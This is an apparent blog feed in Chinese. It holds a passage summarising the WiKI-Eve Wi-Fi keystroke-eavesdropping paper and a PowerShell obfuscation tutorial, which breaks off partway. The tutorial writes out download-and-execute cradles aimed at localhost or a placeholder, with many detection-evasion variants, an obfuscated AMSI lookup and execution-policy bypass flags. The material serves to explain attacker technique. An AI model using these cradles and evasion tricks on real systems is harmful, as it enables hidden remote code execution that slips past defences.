style="zoom:67%;" /></p><p>&emsp;另一种方法称为带外击键推理 (OKI)，如上图 (b) 所示，要求 Eve 使用 Wi-Fi NIC 和另一个设备（例如 AP）创建一个与 Bob 无关的单独通道，Eve 通过观察该通道的 CSI 来推断 Bob 的击键。<code>与依赖模拟 CSI 的 OKI 相比，o-IKI 窃听 BFI 的数字特性有更大的传感范围，而击键推理 KI 的带内传感则确保了足够高的信噪比（SNR）</code>。与 IKI 让 Eve 通过其恶意 AP 直接观察数据流量不同，o-IKI 和 OKI 要求 Eve 能够识别 Bob 的设备，而这在 OKI 下很难实现。</p><h3 id="为什么选择-BFI？"><a href="#为什么选择-BFI？" class="headerlink" title="为什么选择 BFI？"></a>为什么选择 BFI？</h3><p>（1）BFI 易于获取。</p><p>（2）BFI 对通道变化的敏感度低于 CSI，使得传感结果更加稳定，尤其是 IKI 对 Wi-Fi 通道的密切影响（来自屏幕上的击键）。这种稳定性源于 BFI 的生成方式，给定下行链路 CSI 表示为 $H = Y/X$，其中 $X$ 和 $Y$ 分别表示发送 (Tx) 和接收 (Rx) 信号，BFI 是通过将 H（它代表的信道）划分为单独的 Tx 和 Rx 组件，仅 Tx 分量反馈至 AP 以指导 AP 波束成形。由于这种通道分割，BFI 不太容易受到 IKI 屏幕上按键引起的通道变化的影响，否则会导致支持 CSI 的 KI 中出现明显的歧义。</p><p>&emsp;为了验证上述原因，利用 iPerf 生成饱和流量并仅收集原始 BFI 和 CSI 样本，下图显示了单击四个不同键的 BFI 时间序列和频谱图，证实了这些键之间的显着区别：</p><p><img src="/images/Password-Stealing-without-Hacking/image-20231018163222028.png" alt="image-20231018163222028" style="zoom:67%;" /></p><p>&emsp;同时，下图对于 CSI 的四键测试也表明进行 KI 之前需要进行一些重度去噪，因为某些键之间的区别（例如4和“6）似乎被噪音淹没了，因此需要预处理：</p><p><img src="/images/Password-Stealing-without-Hacking/image-20231018163437352.png" alt="image-20231018163437352" style="zoom:67%;" /></p><h2 id="WiKI-Eve的设计"><a href="#WiKI-Eve的设计" class="headerlink" title="WiKI-Eve的设计"></a>WiKI-Eve的设计</h2><p>&emsp;设计流程包括五个步骤：（1）识别受害者；（2）确定受害者访问目标应用服务时的攻击时间；（3）捕获受害者的BFI时间序列；（4）解析和恢复稀疏的 BFI 系列；（5）对 BFI 系列进行分段并执行 KI 来恢复密码。如下所示：</p><p><img src="/images/Password-Stealing-without-Hacking/image-20231018163904402.png" alt="image-20231018163904402" style="zoom:67%;" /> </p><h3 id="步骤1-amp-2"><a href="#步骤1-amp-2" class="headerlink" title="步骤1&amp;2"></a>步骤1&amp;2</h3><p>&emsp;Eve 可以通过流量监控来识别受害者：将各种 MAC 地址的网络流量与用户行为相关联，从而识别 Bob 的 MAC 地址。 <code>受害者识别只能通过 IKI 实现，因为 OKI 的模拟性质禁止使用标头信息来区分多个主体</code>。</p><p>&emsp;一旦锁定了 Bob 的 MAC 地址，Eve 就会当 Bob 即将输入密码时发起攻击。Eve 可以j监视对支付服务提出的请求，对微信而言，Eve 创建了一个与支付服务相关的 IP 地址数据库：<code>虽然此类 IP 地址可以是动态的，但实验表明，来自同一地区的用户在一定时间内会被定向到相同的 IP 地址</code>。</p><h3 id="步骤3-amp-4"><a href="#步骤3-amp-4" class="headerlink" title="步骤3&amp;4"></a>步骤3&amp;4</h3><p>&emsp;首先解释一下 BFI 是如何生成的：BFI 是 CSI $H$ 的发送组件，并被反馈以指导 AP 波束成形。 通过 SVD（奇异值分解），它将 $H$ 分解为 $H=USV$。 在这些组件中，右侧矩阵 $V$ 为 BFI， $U$ 和 $S$ 分别代表接收端波束成形和通道增益。 Bob 的密码输入会影响手机周围 Wi-Fi 信号的衍射。 这种改变反映在下行链路 CSI 中，而下行链路 CSI 用 SVD 分解以获得 BFI 。</p><p>&emsp;由于 BFI 以明文形式传输，Eve 可以使用处于监视模式的 Wi-Fi 设备以及 Wireshark 抓取，遵循 802.11ac 的帧结构，可在<code>VHT 波束成形报告</code>字段中来定位 BFI。为了完全提取 BFI，可以根据 Tx 和 Rx 天线的数量计算场的长度（这是什么意思？）。如果由于时间窗口内控制帧率较低（BFI在控制帧中）而导致 BFI 时间序列过于稀疏，WiKI-Eve 会恢复 BFI 序列。</p><h3 id="步骤5"><a href="#步骤5" class="headerlink" title="步骤5"></a>步骤5</h3><p>&emsp;我们将详细介绍 WiKI-Eve 如何进行 BFI-KI（击键推断）。首先讨论以前方案的缺点并提出改进。指定 BFI 系列上的信号分割来启动 KI，然后设计 KI 神经模型及其对抗性学习框架，将 KI 泛化。</p><h4 id="现有技术的缺点"><a href="#现有技术的缺点" class="headerlink" title="现有技术的缺点"></a>现有技术的缺点</h4><p>&emsp; WindTalker 通过<code>独立的基于规则的 CSI 分割对各个击键进行分类</code>。这种分割可能导致信息丢失，我们要求两名受试者在各自的智能手机上输入密码，下图显示了他们相应的 CSI 系列。显然，由于受试者不同的打字习惯，虽然基于规则的分割对于打字更稳定的主体 A 可能有效，但对于 B 来说可能失败。</p><p><img src="/images/Password-Stealing-without-Hacking/image-20231018174224520.png" alt="image-20231018174224520" style="zoom:67%;" /></p><p>&emsp;WINK 通过系列学习（series learning）（应该是一个密码序列）来提高 KI 性能。 然而，它继承了基于规则的分割，因此也有同样的弱点。 此外，由于语言结构不能用于系列学习，WINK 认为击键之间的过渡特征可以作为提高 KI 准确性的替代方法。但是，<code>打字习惯和智能手机类型等因素可能会在过渡期间影响 CSI，从而导致同一密码具有不同的特征</code>，如下所示，可见过渡特征也不靠谱：</p><p><img src="/images/Password-Stealing-without-Hacking/image-20231018184339999.png" alt="image-20231018184339999" style="zoom:67%;" /></p><p>&emsp;WiKI-Eve 使用由 WindTalker 执行的推断单个击键的规范方法。为了防止分割中的信息丢失，<code>WiKI-Eve 将过渡期视为同一数字击键的不同域</code>。因此，<code>利用对抗性学习来训练 KI 模型，旨在消除域干扰（即环境依赖性），从而将 KI 推广到未见过的场景</code>。请注意，WiKI-Eve 不太可能使用系列学习，如果这样，它需要一个非常大的训练数据集，其大小随着密码长度增长呈指数增长。</p><h4 id="信号分割"><a href="#信号分割" class="headerlink" title="信号分割"></a>信号分割</h4><p>&emsp;BFI 序列可能不会显示连续击键之间的明显边界，从而使信号分割变得非常复杂。下图提供了这种情况的示例，其中 BFI 序列显示了与 Bob 的手指敲击屏幕相对应的突出峰值，以及代表其手指的过渡运动的两个峰值之间的波动。由于过渡期携带先前和后续击键的信息，因此相邻击键的片段应包含该过渡。因此，我们建议采用重叠分割方法，该方法合并位于两个连续峰值之间（从前一个峰值到后续峰值）的所有数据样本。</p><p><img src="/images/Password-Stealing-without-Hacking/image-20231018225636845.png" alt="image-20231018225636845" style="zoom:67%;" /></p><p>&emsp;分割方法首先利用恒定误报率 (CFAR) 算法来识别 BFI 系列中的峰值。假设 Bob 输入 K 位数字密码，经过稀疏恢复后产生长度为 L 的 BFI 序列，CFAR 算法对该序列进行统计分析，以确定一个自适应阈值，并选择超过该阈值的峰值作为候选人。在这些候选峰中，我们进一步消除了距主峰 W 个采样点距离内的次要峰（主峰如何判断？）。然后，我们在 W 个采样点的峰间距离的辅助下，选择与密码中的 K 个数字相对应的前 K 个峰值，其中$W=\alpha\times\frac{L}{K}$。由于密码中的第一个和最后一个数字没有前后数字，因此我们选择扩展前后的 $N$ 点作为段边界，其中$N=\beta\times\frac{L}{K}$。我们将根据经验确定 $\alpha$ 和 $\beta$ 值。如上图，这种方法有效地将 BFI 系列（密码175249）划分为与各个击键相对应的片段。</p><h4 id="对抗性学习框架"><a href="#对抗性学习框架" class="headerlink" title="对抗性学习框架"></a>对抗性学习框架</h4><p>&emsp;本节解释如何利用对抗性学习将 KI 推广到未见过的领域。时间序列分类可以使用一维 CNN 有效解决。然而，BFI 段的长度可能不同，这对传统的一维 CNN 提出了挑战。为了克服这个问题，采用自适应平均池层（减少参数量）来增强一维 CNN 的灵活性。具体来说，<code>该层自动计算生成固定大小的输出特征图所需的适当内核大小，从而使一维 CNN 能够适应不同长度的输入</code>。</p><p>&emsp;上面的深度学习方法忽略了域对每次击键的影响。域指的是击键前到击键后的转换所产生的上下文，它由打字速度、相邻击键等影响。如下所示，考虑三个不同域中的数字键”1”：”5-1-3”、”6-1-8”和”4-1-2”，并呈现它们相应的特征图，可以发现有极大的不同。</p><p><img src="/images/Password-Stealing-without-Hacking/image-20231019110518474.png" alt="image-20231019110518474" style="zoom:67%;" /></p><p>&emsp;上述域干扰需要一种确保 KI 对此类干扰不变的方法，因此采用<code>域适应</code>的思想来学习跨不同域不变的击键表示。 WiKI-Eve 利用对抗性学习，将域适应与 KI 集成到统一的训练过程中，从而在不同领域实现一致的特征空间表示。训练过程如下所示：</p><p><img src="/images/Password-Stealing-without-Hacking/image-20231019111236393.png" alt="image-20231019111236393" style="zoom:67%;" /></p><p>&emsp;在训练阶段，首先准备随机成对的 BFI 片段组成的数据集，这些片段对应于相同的密钥（例如”1”），但在不同的域下，例如”4-1-2”和”5-1-3”。我们将这对连接起来作为输入 $x$ 并过特征提取器 $G_f$ ，然后输出给到击键分类器 $G_c$ 和域鉴别器 $G_d$ ：$G_c$ 推断出对中两个段相同的键 $y$，$G_d$ 预测域差异 $\Delta\in{0,1}$，其中 0/1 分别表示密钥来自/不来自同一域。虽然 $G_d$ 的目标是提高预测 $\Delta$ 的准确性，但对抗性学习策略通过使用梯度反转层（GRL）来反转损失，从而欺骗 $G_d$；此过程抑制 $G_f$ 输出中的特定于域的特征，从而允许一维 CNN 学习跨域不变的击键表示。</p><p>&emsp;将 $G<em>f$ 、$G_c$ 和 $G_d$ 的参数分别表示为 $\theta</em>{\mathbf{f}}$、$\theta<em>{\mathbf{c}}$ 、$\theta</em>{\mathbf{d}}$，上述训练过程可以表示为：</p><script type="math/tex; mode=display">(\hat{\theta}_{\mathrm{f}},\hat{\theta}_{\mathrm{c}})=\arg\min_{\theta_{\mathrm{f}},\theta_{\mathrm{c}}}\mathcal{L}(y,\Delta,\mathbf{x}),\quad\hat{\theta}_{\mathrm{d}}=\arg\max_{\theta_{\mathrm{d}}}\mathcal{L}(y,\Delta,\mathbf{x})</script><p>&emsp;其中，有$\mathcal{L}(y,\Delta,\boldsymbol{x})=\mathcal{L}<em>{\mathrm{C}}(y,G</em>{\mathrm{C}}(G<em>{\mathrm{f}}(\boldsymbol{x})))-\lambda\mathcal{L}</em>{\mathrm{d}}(\Delta,G<em>{\mathrm{d}}(G</em>{\mathrm{f}}(\boldsymbol{x}))$，$\mathcal{L}<em>{\mathrm{C}}$与$\mathcal{L}</em>{\mathrm{d}}$代表$G_c$与$G_d$的交叉熵损失，$G_d$ 在推理阶段被丢弃，并且通过复制原始 BFI 段（一对片段”4-1-2”与”4-1-2”）来模拟段对 x 的输入。</p><h4 id="恢复稀疏-BFI-时间序列"><a href="#恢复稀疏-BFI-时间序列" class="headerlink" title="恢复稀疏 BFI 时间序列"></a>恢复稀疏 BFI 时间序列</h4><p>&emsp;WiKI-Eve 的另一挑战是流量稀疏性。为了研究稀疏流量如何影响击键丢失和分类准确性，使用 iPerf 生成设备和 AP 之间的数据流量。以 6 位密码为例，我们可以观察到漏击的击键次数几乎随着稀疏度呈线性增加，如下图 (a) 所示。 当流量比例为20%时，最多可能会错过2次按键。 即使对于那些没有遗漏的击键，如下图 (b) 所示，当流量比例下降到 20% 时，对单个数字进行分类的准确率也会从 80% 下降到不到 20%。</p><p><img src="/images/Password-Stealing-without-Hacking/image-20231019120941475.png" alt="image-20231019120941475" style="zoom:67%;" /></p><p>&emsp;我们提出了SRA（稀疏恢复算法）。具体而言，我们使用长度为 $\Delta t=1s$ 的滑动窗口来检查是否包含足够的样本，如果滑动窗口内50%的时间段没有BFI，则攻击失败，若大于50%，启动SRA（说明不能太稀疏）。如下图所示，SRA 首先对收集的序列进行重新采样，使其以 $f_s$ 的采样频率均匀分布。随后，该序列被归一化到[0, 1]的范围，没有数据样本的片段被标记为-1。重采样后，我们将 SRA 的输入数据表示为从BFI中提取的一维时间序列 $x_t$，其中 $t$ 是采样时间。 SRA 将输出均匀且密集采样的时间序列 $y_t$。</p><p>&emsp;为了生成缺失样本，SRA 采用基于 AE（自动编码器）网络的 TCN（时间卷积网络，例如LSTM），由编码器和解码器组成，如下图所示。TCN 使用具有扩张内核的卷积层来捕获样本中的远程依赖性，同时保持参数数量的可控性。 TCN-AE 以自我监督的方式进行训练：首先使用饱和流量生成非稀疏 BFI 系列，然后随机删除数据样本以创建稀疏序列，通过遵循真实的时间分布来模拟现实的稀疏性。</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;WiKI-Eve-Wi-Fi-Enabled-Practical-Keystroke-Eavesdropping&quot;&gt;&lt;a href=&quot;#WiKI-Eve-Wi-Fi-Enabled-Practical-Keystroke-Eavesdropping&quot; class=&quot;headerlink&quot; title=&quot;WiKI-Eve:Wi-Fi Enabled Practical Keystroke Eavesdropping&quot;&gt;&lt;/a&gt;WiKI-Eve:Wi-Fi Enabled Practical Keystroke Eavesdropping&lt;/h1&gt;&lt;h2 id=&quot;摘要&quot;&gt;&lt;a href=&quot;#摘要&quot; class=&quot;headerlink&quot; title=&quot;摘要&quot;&gt;&lt;/a&gt;摘要&lt;/h2&gt;&lt;p&gt;&amp;emsp;Wi-Fi 的非接触式特性可以泄露隐私，但针对 Wi-Fi CSI（信道状态信息）的攻击需要攻击 Wi-Fi 硬件，这非常困难。为此，我们提出了 WiKI-Eve 技术，无需攻击即可&lt;code&gt;窃听智能手机上的按键操作&lt;/code&gt;。 WiKI-Eve 利用了 Wi-Fi 硬件提供的 BFI（波束成形反馈信息）功能：&lt;code&gt;由于 BFI 以明文形式从智能手机传输到 AP（路由器），因此它可以被切换到监听模式的 Wi-Fi 设备偷听&lt;/code&gt;。WiKI-Eve 还创新了对抗性学习方案，使其推理能够泛化到未见过的场景。结果表明，WiKI-Eve 对单个击键的推理准确率达到 88.9%，对窃取移动应用程序（例如微信）密码的准确率高达 65.8%。&lt;/p&gt;
&lt;p&gt;&amp;emsp;没找到代码呜呜…&lt;/p&gt;</summary>
    
    
    
    <category term="papers" scheme="https://wd-2711.tech/categories/papers/"/>
    
    
  </entry>
  
  <entry>
    <title>ps-obfuscation</title>
    <link href="https://wd-2711.tech/2023/10/15/ps-obfuscation/"/>
    <id>https://wd-2711.tech/2023/10/15/ps-obfuscation/</id>
    <published>2023-10-15T02:59:20.000Z</published>
    <updated>2023-10-16T16:17:38.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="powershell混淆与反混"><a href="#powershell混淆与反混" class="headerlink" title="powershell混淆与反混"></a>powershell混淆与反混</h1><p>&emsp;powershell是基于<code>.net</code>开发的自动化语言。利用ps可以进行很多攻击，例如，利用<code>DownloadString</code>，能够在设备上运行命令/外壳代码/可执行文件，而<code>无需对设备磁盘进行任何写入操作</code>。或者使用<code>Marshall</code>类，外壳代码可以在内存中解密，并且可以在<code>不写入磁盘的情况下执行</code>。ps提供了对机器内核的访问，包括对Windows API的无限制访问。因此，越来越多的网络犯罪分子将PowerShell加入了他们的攻击武器库。</p><span id="more"></span><h2 id="powershell使用的参数"><a href="#powershell使用的参数" class="headerlink" title="powershell使用的参数"></a>powershell使用的参数</h2><h4 id="ExecutionPolicy"><a href="#ExecutionPolicy" class="headerlink" title="ExecutionPolicy"></a>ExecutionPolicy</h4><p>&emsp;为安全目的创建的策略，可确定可以在设备上运行的powershell脚本的类型：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Restricted：无法在设备上运行脚本</span><br><span class="line">AllSigned：只有由受信任的发布者签名的脚本才能运行</span><br><span class="line">RemoteSigned：只有本地生成的脚本文件才能运行</span><br><span class="line">Unrestricted：可以运行本地创建和签名的脚本，对于远程运行的脚本，将显示命令提示符</span><br><span class="line">Bypass：所有脚本都可以在设备上运行</span><br></pre></td></tr></table></figure><p>&emsp;攻击者假设<code>ExecutionPolicy</code>值是<code>Restricted</code>或<code>RemoteSigned</code>的。此时，攻击者使用<code>powershell -EP bypass</code>或者<code>powershell -ExecutionPolicy bypass</code>来绕过。</p><h4 id="EncodedCommand"><a href="#EncodedCommand" class="headerlink" title="EncodedCommand"></a>EncodedCommand</h4><p>&emsp;Powershell 可以解码并运行 Base64 值，使用<code>powershell -EncodedCommand &#39;Base64 &#39;</code>。</p><h4 id="NonInteractive-NonI"><a href="#NonInteractive-NonI" class="headerlink" title="NonInteractive(NonI)"></a>NonInteractive(NonI)</h4><p>&emsp;执行非交互式脚本。</p><h4 id="NoProfile（NoP）"><a href="#NoProfile（NoP）" class="headerlink" title="NoProfile（NoP）"></a>NoProfile（NoP）</h4><p>&emsp;允许用户在不加载powershell配置文件的情况下运行脚本。powershell配置文件包括：<code>Powershell变量、自定义设置、函数</code>。通过禁用此配置文件，攻击者可以禁用ExecutionPolicy值，因此可以绕过。</p><h4 id="Sta"><a href="#Sta" class="headerlink" title="Sta"></a>Sta</h4><p>&emsp;单线程单元。一些 COM（组件对象模型）对象需要单线程单元模型。COM 对象用于访问系统服务。如果攻击者在其脚本中使用COM对象，可使用此参数来确保脚本能够工作。</p><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>&emsp;因此，常见的ps命令行选项如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -NoP -sta -NonI -W Hidden -Enc</span><br></pre></td></tr></table></figure><h2 id="powershell混淆技法（绕过技法）"><a href="#powershell混淆技法（绕过技法）" class="headerlink" title="powershell混淆技法（绕过技法）"></a>powershell混淆技法（绕过技法）</h2><h3 id="去除关键字"><a href="#去除关键字" class="headerlink" title="去除关键字"></a>去除关键字</h3><p>&emsp;去除一些关键字，例如<code>system</code>等，例如：脚本中的<code>New-Object System.Net.WebClient</code> 可以改为<code>New-Object Net.WebClient</code>。</p><h3 id="字符串操作"><a href="#字符串操作" class="headerlink" title="字符串操作"></a>字符串操作</h3><h4 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h4><p>&emsp;对于脚本中的字符串，例如<code>&quot;http://127.0.0.1/powershell&quot;</code>，可以改为<code>&quot;ht&quot;+&quot;tp://127.0.0.1/powershell&quot;</code>。</p><h4 id="替换"><a href="#替换" class="headerlink" title="替换"></a>替换</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$value1 = &quot;Onlyf8&quot;</span><br></pre></td></tr></table></figure><p>&emsp;可以写为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$value1 = &quot;Oxxxaaanaaaabbbxlxxxaaaabbbbyfaaaaxxxxbb8&quot;</span><br><span class="line">$value1.Replace(&quot;x&quot;,&quot;&quot;).Replace(&quot;a&quot;,&quot;&quot;).Replace(&quot;b&quot;,&quot;&quot;)</span><br></pre></td></tr></table></figure><p>&emsp;再比如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$value1_=[Ref].Assembly.GetType((&#x27;System.Management.Automation.AmsiUtils&#x27;));</span><br></pre></td></tr></table></figure><p>&emsp;可以写为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$value1_=[Ref].Assembly.GetType(((&#x27;&#123;4&#125;&#123;0&#125;&#123;9&#125;tem.&#123;3&#125;ana&#123;6&#125;ement.&#123;8&#125;&#123;2&#125;t&#123;7&#125;mati&#123;7&#125;n.&#123;8&#125;m&#123;9&#125;i&#123;5&#125;ti&#123;1&#125;&#123;9&#125;&#x27;)-f&#x27;y&#x27;,&#x27;l&#x27;,&#x27;u&#x27;,&#x27;M&#x27;,&#x27;S&#x27;,&#x27;U&#x27;,&#x27;g&#x27;,&#x27;o&#x27;,&#x27;A&#x27;,&#x27;s&#x27;));</span><br></pre></td></tr></table></figure><h4 id="大小写"><a href="#大小写" class="headerlink" title="大小写"></a>大小写</h4><p>&emsp;<code>&quot;hello&quot;</code>可以写成<code>&quot;hELLO&quot;</code>。</p><h4 id="空格"><a href="#空格" class="headerlink" title="空格"></a>空格</h4><p>&emsp;<code>&quot;hello&quot;</code>可以写成<code>&quot;he   llo&quot;</code>。</p><h4 id="字符串转为命令"><a href="#字符串转为命令" class="headerlink" title="字符串转为命令"></a>字符串转为命令</h4><p>&emsp;<code>&quot;iex&quot;</code>转命令为<code>&amp;(&quot;iex&quot;)</code>。</p><h3 id="使用Invoke方法"><a href="#使用Invoke方法" class="headerlink" title="使用Invoke方法"></a>使用Invoke方法</h3><p>&emsp;对于脚本中的方法调用，可以改为使用Invoke进行调用，例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-Expression (New-Object System.Net.WebClient).DownloadString(&quot;xxx&quot;)</span><br></pre></td></tr></table></figure><p>&emsp;可以改为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-Expression (New-Object System.Net.WebClient).(&quot;DownloadString&quot;).Invoke(&quot;xxx&quot;)</span><br></pre></td></tr></table></figure><h3 id="使用NewScriptBlock命令"><a href="#使用NewScriptBlock命令" class="headerlink" title="使用NewScriptBlock命令"></a>使用NewScriptBlock命令</h3><p>&emsp;例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-Expression (New-Object System.Net.WebClient).DownloadString(&quot;xxx&quot;)</span><br></pre></td></tr></table></figure><p>&emsp;可以改为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.($ExecutionContext.InvokeCommand.NewScriptBlock(&#x27;invoke-expression (New-Object System.Net.WebClient).DownloadString(&quot;xxx&quot;)&#x27;))</span><br></pre></td></tr></table></figure><h3 id="使用invoke-command-xxx-（icm）命令"><a href="#使用invoke-command-xxx-（icm）命令" class="headerlink" title="使用invoke-command{xxx}（icm）命令"></a>使用invoke-command{xxx}（icm）命令</h3><p>&emsp;例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-Expression (New-Object System.Net.WebClient).DownloadString(&quot;xxx&quot;)</span><br></pre></td></tr></table></figure><p>&emsp;可以改为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">invoke-command&#123;Invoke-Expression (New-Object System.Net.WebClient).DownloadString(&quot;xxx&quot;)&#125;</span><br></pre></td></tr></table></figure><p>&emsp;将<code>invoke-command</code>缩写为<code>icm</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">icm&#123;Invoke-Expression (New-Object System.Net.WebClient).DownloadString(&quot;xxx&quot;)&#125;</span><br></pre></td></tr></table></figure><h3 id="变量替代"><a href="#变量替代" class="headerlink" title="变量替代"></a>变量替代</h3><p>&emsp;例如脚本：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-Expression (New-Object System.Net.WebClient).DownloadString(&quot;xxx&quot;)</span><br></pre></td></tr></table></figure><p>&emsp;可以改为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Invoke-Expression $test = New-Object System.Net.WebClient</span><br><span class="line">$test.DownloadString(&quot;xxx&quot;)</span><br></pre></td></tr></table></figure><h3 id="关键字使用单双引号"><a href="#关键字使用单双引号" class="headerlink" title="关键字使用单双引号"></a>关键字使用单双引号</h3><p>&emsp;例如脚本：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-Expression (New-Object System.Net.WebClient).DownloadString(&quot;xxx&quot;)</span><br></pre></td></tr></table></figure><p>&emsp;可以改为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-Expression (New-Object System.Net.WebClient).&quot;DownloadString&quot;.Invoke(&quot;xxx&quot;)</span><br></pre></td></tr></table></figure><p>&emsp;与<code>使用Invoke方法</code>类似，之后都可以接着使用<code>字符串链接</code>进行下一步混淆。</p><p>&emsp;也可以改成：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-Expression (New-Object (&quot;System.Net.WebClient&quot;)).&quot;DownloadString&quot;.Invoke(&quot;xxx&quot;)</span><br></pre></td></tr></table></figure><h3 id="转义"><a href="#转义" class="headerlink" title="转义"></a>转义</h3><p>&emsp;例如脚本：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-Expression (New-Object System.Net.WebClient).DownloadString(&quot;http://127.0.0.1/1&quot;)</span><br></pre></td></tr></table></figure><p>&emsp;可以改为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-Expression (New-Object System.Net.WebClient).DownloadString(&quot;`htt`p`:`/`/`1`2`7`.`0`.`0`.`1`/`1&quot;)</span><br></pre></td></tr></table></figure><p>&emsp;但是注意，有些字符转义后会影响本身的含义：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">`a----警报</span><br><span class="line">`b----退格</span><br><span class="line">`f----换页</span><br><span class="line">`n----换行</span><br><span class="line">`r----回车</span><br><span class="line">`t----水平制表</span><br><span class="line">`v----垂直制表</span><br></pre></td></tr></table></figure><h3 id="使用通配符"><a href="#使用通配符" class="headerlink" title="使用通配符*"></a>使用通配符*</h3><p>&emsp;例如New-Object，使用通配符<code>*</code>可写成如下形式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&amp;(Get-Command New-Obje*)</span><br><span class="line">&amp;(Get-Command N*-O*)</span><br><span class="line">&amp;(GCM *w-O*)</span><br><span class="line">&amp;(COMMAND *w-*ct)</span><br></pre></td></tr></table></figure><h3 id="动态变量混淆"><a href="#动态变量混淆" class="headerlink" title="动态变量混淆"></a>动态变量混淆</h3><p>&emsp;例如DownloadString，通过遍历函数并模糊匹配的方式找到此调用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-Expression (New-Object System.Net.WebClient).&quot;DownloadString&quot;.Invoke(&quot;xxx&quot;)</span><br></pre></td></tr></table></figure><p>&emsp;可以改为（<code>`$_</code> 表示当前正在处理的对象）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-Expression (New-Object System.Net.WebClient).PsObject.Methods|Where-Object &#123;$_.Name -like &quot;*own*d*ing&quot;&#125;(&quot;http://127.0.0.1/1&quot;)</span><br></pre></td></tr></table></figure><h3 id="变量传递"><a href="#变量传递" class="headerlink" title="变量传递"></a>变量传递</h3><p>&emsp;写入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd.exe /c &quot;set cmd=Write-Host ENV-Fore Green&amp;&amp;powershell IEX $env:cmd&quot;</span><br></pre></td></tr></table></figure><p>&emsp;其中<code>-c</code>代表执行命令后立即终止。之后执行两条指令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set cmd=Write-Host ENV-Fore Green</span><br></pre></td></tr></table></figure><p>&emsp;代表定义cmd为一条ps指令，其为<code>Write-Host ENV-Fore Green</code>，当在ps中输入命令后，命令会赋给cmd。</p><p>&emsp;接着执行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell IEX $env:cmd</span><br></pre></td></tr></table></figure><p>&emsp;即运行刚才输入的命令。</p><h3 id="字符串反转"><a href="#字符串反转" class="headerlink" title="字符串反转"></a>字符串反转</h3><p>&emsp;例如脚本：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-Expression (New-Object Net.WebClient).DownloadString(&#x27;http://127.0.0.1/1&#x27;)</span><br></pre></td></tr></table></figure><p>&emsp;可以改为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$re = &quot;)&#x27;1/1.0.0.721//:ptth&#x27;(gnirtSdaolnwoD.)tneilCbeW.teN tcejbO-weN(&quot;;</span><br><span class="line">Invoke-Expression ($re[-1..-($re.Length)] -Join &#x27;&#x27;)</span><br></pre></td></tr></table></figure><h3 id="base64编码执行"><a href="#base64编码执行" class="headerlink" title="base64编码执行"></a>base64编码执行</h3><p>&emsp;例如脚本：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span 